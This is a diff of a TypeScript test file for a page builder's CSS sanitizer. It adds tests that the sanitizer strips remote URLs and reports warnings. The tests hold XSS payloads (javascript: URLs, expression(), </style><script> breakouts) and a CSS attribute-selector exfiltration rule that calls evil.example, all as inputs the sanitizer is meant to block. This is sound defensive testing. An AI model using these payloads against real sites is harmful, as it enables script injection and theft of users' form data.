@@ -4,28 +4,28 @@ import { sanitizeBlockCss, sanitizeCustomCss } from "./css-sanitize";
 
 const SCOPE = "nx-pb-page-abc";
 
+/** The sanitized CSS alone; the warnings have their own suite below. */
+const clean = (css: string, scope: string): string =>
+  sanitizeCustomCss(css, scope).css;
+const cleanBlock = (css: string, scope: string): string =>
+  sanitizeBlockCss(css, scope).css;
+
 describe("sanitizeCustomCss", () => {
   it("scopes a simple rule under the page root", () => {
-    const out = sanitizeCustomCss(".hero { color: red }", SCOPE);
+    const out = clean(".hero { color: red }", SCOPE);
     expect(out).toContain(`.${SCOPE} .hero`);
     expect(out).toContain("color:red");
   });
 
   it("drops declarations with javascript: / expression()", () => {
-    const js = sanitizeCustomCss(
-      ".a { background: url(javascript:alert(1)) }",
-      SCOPE
-    );
+    const js = clean(".a { background: url(javascript:alert(1)) }", SCOPE);
     expect(js.toLowerCase()).not.toContain("javascript:");
-    const expr = sanitizeCustomCss(".a { width: expression(alert(1)) }", SCOPE);
+    const expr = clean(".a { width: expression(alert(1)) }", SCOPE);
     expect(expr.toLowerCase()).not.toContain("expression(");
   });
 
   it("strips @import", () => {
-    const out = sanitizeCustomCss(
-      '@import url("evil.css"); .a { color: red }',
-      SCOPE
-    );
+    const out = clean('@import url("evil.css"); .a { color: red }', SCOPE);
     expect(out.toLowerCase()).not.toContain("@import");
     expect(out).toContain(`.${SCOPE} .a`);
   });
@@ -40,7 +40,7 @@ describe("sanitizeCustomCss", () => {
     // inside a `<style>`, only `</style` ends the raw-text run. `<` is not
     // escaped wholesale because `@media (400px<width)` is valid CSS and
     // escaping there would break the query.
-    const out = sanitizeCustomCss(
+    const out = clean(
       ".hero { color: red } </style><script>alert(1)</script>",
       SCOPE
     );
@@ -53,7 +53,7 @@ describe("sanitizeCustomCss", () => {
     // `csstree.generate` decodes escapes, so this reaches the page as literal
     // `</style>` even though the source contains no markup. Filtering the input
     // cannot see it; only the generated text can.
-    const out = sanitizeCustomCss(
+    const out = clean(
       `.a { content: "\\3c /style>\\3c img src=x onerror=alert(1)>" }`,
       SCOPE
     );
@@ -64,16 +64,14 @@ describe("sanitizeCustomCss", () => {
   it("keeps an escaped sequence meaning the same thing", () => {
     // `\3c` and `<` are one character to a CSS parser, so the author still gets
     // what they wrote; only the bytes the HTML parser sees change.
-    expect(sanitizeCustomCss(`.a { content: "</div>" }`, SCOPE)).toContain(
+    expect(clean(`.a { content: "</div>" }`, SCOPE)).toContain(
       `content:"\\3c /div>"`
     );
   });
 
   it("leaves the angle brackets that valid CSS needs", () => {
-    expect(sanitizeCustomCss(".a > .b { color: red }", SCOPE)).toContain(
-      ".b{color:red}"
-    );
-    const range = sanitizeCustomCss(
+    expect(clean(".a > .b { color: red }", SCOPE)).toContain(".b{color:red}");
+    const range = clean(
       "@media (400px < width < 800px) { .a { color: red } }",
       SCOPE
     );
@@ -85,53 +83,50 @@ describe("sanitizeCustomCss", () => {
     // those asks a different question than the author did: `.a:has(> .b)`
     // scoped inside becomes `.a:has(.scope > .b)`, which no longer means "has a
     // child .b".
-    expect(sanitizeCustomCss(".a:not(.b) { color: red }", SCOPE)).toBe(
+    expect(clean(".a:not(.b) { color: red }", SCOPE)).toBe(
       `.${SCOPE} .a:not(.b){color:red}`
     );
-    expect(sanitizeCustomCss(".a:is(.b, .c) { color: red }", SCOPE)).toBe(
+    expect(clean(".a:is(.b, .c) { color: red }", SCOPE)).toBe(
       `.${SCOPE} .a:is(.b,.c){color:red}`
     );
-    expect(sanitizeCustomCss(".a:has(> .b) { color: red }", SCOPE)).toBe(
+    expect(clean(".a:has(> .b) { color: red }", SCOPE)).toBe(
       `.${SCOPE} .a:has(>.b){color:red}`
     );
   });
 
   it("scopes every part of a selector list", () => {
-    expect(sanitizeCustomCss(".a, .b { color: red }", SCOPE)).toBe(
+    expect(clean(".a, .b { color: red }", SCOPE)).toBe(
       `.${SCOPE} .a,.${SCOPE} .b{color:red}`
     );
   });
 
   it("preserves @media and scopes the rules inside it", () => {
-    const out = sanitizeCustomCss(
-      "@media (max-width: 640px) { .a { color: red } }",
-      SCOPE
-    );
+    const out = clean("@media (max-width: 640px) { .a { color: red } }", SCOPE);
     expect(out).toContain("@media");
     expect(out).toContain(`.${SCOPE} .a`);
   });
 
   it("does not throw on malformed CSS and still scopes recoverable rules", () => {
-    const out = sanitizeCustomCss(".a { color: red }}} .b { x: 1 }", SCOPE);
+    const out = clean(".a { color: red }}} .b { x: 1 }", SCOPE);
     expect(typeof out).toBe("string");
     expect(out).toContain(`.${SCOPE}`);
   });
 
   it("returns empty string for empty input", () => {
-    expect(sanitizeCustomCss("", SCOPE)).toBe("");
+    expect(clean("", SCOPE)).toBe("");
   });
 });
 
 describe("sanitizeBlockCss", () => {
   it("rewrites the `selector` keyword to the block scope class", () => {
-    const out = sanitizeBlockCss("selector { color: red; }", "nx-pb-abc");
+    const out = cleanBlock("selector { color: red; }", "nx-pb-abc");
     expect(out).toContain(".nx-pb-abc");
     expect(out).toContain("color:red");
     expect(out).not.toMatch(/(^|[^-.])selector\b/);
   });
 
   it("scopes descendant selectors under the block", () => {
-    const out = sanitizeBlockCss(
+    const out = cleanBlock(
       "selector .title { font-weight: 700; }",
       "nx-pb-abc"
     );
@@ -140,12 +135,12 @@ describe("sanitizeBlockCss", () => {
   });
 
   it("scopes a bare selector under the block too", () => {
-    const out = sanitizeBlockCss("p { margin: 0; }", "nx-pb-abc");
+    const out = cleanBlock("p { margin: 0; }", "nx-pb-abc");
     expect(out).toMatch(/\.nx-pb-abc\s+p/);
   });
 
   it("drops dangerous declarations", () => {
-    const out = sanitizeBlockCss(
+    const out = cleanBlock(
       "selector { background: url(javascript:alert(1)); }",
       "nx-pb-abc"
     );
@@ -153,7 +148,102 @@ describe("sanitizeBlockCss", () => {
   });
 
   it("does not double-scope a selector already prefixed with the block class", () => {
-    const out = sanitizeBlockCss("selector { color: red; }", "nx-pb-abc");
+    const out = cleanBlock("selector { color: red; }", "nx-pb-abc");
     expect(out).not.toMatch(/\.nx-pb-abc\s+\.nx-pb-abc/);
+  });
+});
+
+describe("custom CSS may not reach off this origin", () => {
+  // The channel this closes: a selector that matches only on a prefix, plus a
+  // URL that fires a request when it does, reads a value out one character at a
+  // time. Custom CSS is the only surface where an author controls both.
+  const EXFILTRATION = `input[value^="a"] { background: url("https://evil.example/a") }`;
+
+  it("removes a declaration that fetches from another origin", () => {
+    const out = sanitizeCustomCss(EXFILTRATION, SCOPE);
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
+  });
+
+  it("removes every scheme, not a list of the dangerous ones", () => {
+    // The allowlist is "no scheme at all", so a scheme nobody thought to ban is
+    // refused for the same reason as the ones they did.
+    for (const url of [
+      "https://evil.example/a.png",
+      "http://evil.example/a.png",
+      "//evil.example/a.png",
+      "data:image/svg+xml,<svg/>",
+      "chrome-extension://abc/x.png",
+      "webcal://evil.example/x",
+    ]) {
+      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
+      expect(out.css).not.toContain("evil.example");
+      expect(out.css).not.toContain("data:");
+      expect(out.warnings.length).toBeGreaterThan(0);
+    }
+  });
+
+  it("reads a scheme spelled with CSS escapes", () => {
+    // `csstree` decodes the URL, so the check sees what a browser would fetch
+    // rather than what the author typed.
+    const out = sanitizeCustomCss(
+      `.a { background: url("\\68 ttps://evil.example/a") }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
+  });
+
+  it("keeps the paths that resolve against this site", () => {
+    for (const url of ["/media/hero.png", "./hero.png", "hero.png", "#frag"]) {
+      const out = sanitizeCustomCss(`.a { background: url("${url}") }`, SCOPE);
+      expect(out.css).toContain("background");
+      expect(out.warnings).toEqual([]);
+    }
+  });
+
+  it("says what went and where to put the file instead", () => {
+    // A declaration that vanished without explanation is the thing authors file
+    // bugs about, and their own source still contains the line that did not
+    // survive, so there is nothing to read back.
+    const out = sanitizeCustomCss(
+      `.a { background: url("https://fonts.example/x.woff2") }`,
+      SCOPE
+    );
+    expect(out.warnings).toHaveLength(1);
+    expect(out.warnings[0]?.message).toContain("background");
+    expect(out.warnings[0]?.message).toContain("fonts.example");
+    expect(out.warnings[0]?.message).toContain("media library");
+  });
+
+  it("reports an at-rule it cannot support, rather than dropping it quietly", () => {
+    const out = sanitizeCustomCss(
+      `@import url("/local.css"); .a { color: red }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("@import");
+    expect(out.warnings.map(w => w.code)).toContain("unsupported-at-rule");
+    expect(out.warnings[0]?.message).toContain("@import");
+  });
+
+  it("does not repeat one message for every rule that trips it", () => {
+    const many = Array.from(
+      { length: 5 },
+      (_, i) => `.a${i} { background: url("https://evil.example/a") }`
+    ).join("\n");
+    const out = sanitizeCustomCss(many, SCOPE);
+    expect(out.css).not.toContain("evil.example");
+    // Same property, same URL: one message. Five identical lines teach nothing
+    // and bury anything else the author needs to read.
+    expect(out.warnings).toHaveLength(1);
+  });
+
+  it("reports through the per-block entry point too", () => {
+    const out = sanitizeBlockCss(
+      `selector { background: url("https://evil.example/a") }`,
+      "nx-pb-abc"
+    );
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
   });
 });
